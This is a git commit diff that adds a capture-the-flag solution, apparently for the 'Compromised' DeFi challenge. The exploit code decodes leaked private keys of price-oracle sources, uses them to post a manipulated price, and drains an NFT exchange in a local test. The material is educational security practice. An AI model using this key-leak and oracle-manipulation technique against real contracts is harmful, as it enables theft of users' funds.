259815849bd83f81218aeb4bdb3bdd3f8452ed4c
ripwu <iripwu@gmail.com>
2021-08-27 00:31:04 +0800

    compromised

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -48,6 +48,33 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const accounts = [
+            '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
+            '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'
+        ].map(x =>  {
+            const hex = '0x' + x.replace(/[ ]+/g, '');
+            const text = web3.utils.hexToAscii(hex);
+            const buffer = Buffer.from(text, "base64");
+            const privateKey = buffer.toString();
+
+            return web3.eth.accounts.privateKeyToAccount(privateKey);
+        });
+
+        accounts.forEach(async (account) => {
+            await web3.eth.personal.importRawKey(account.privateKey, '');
+            await web3.eth.personal.unlockAccount(account.address, '', 600);
+        }) ;
+
+        const price = await this.oracle.getMedianPrice(await this.token.symbol());
+        const buyOneTx = await this.exchange.buyOne({ from: attacker, value: price });
+        const tokenId = buyOneTx.logs[0].args.tokenId.toString(); // XXX
+        const amount = await balance.current(this.exchange.address)
+
+        await this.oracle.postPrice(await this.token.symbol(), amount, { from: accounts[0].address });
+        await this.oracle.postPrice(await this.token.symbol(), amount, { from: accounts[1].address });
+
+        await this.token.approve(this.exchange.address, tokenId, { from: attacker });
+        await this.exchange.sellOne(tokenId, { from: attacker });
     });
 
     after(async function () {
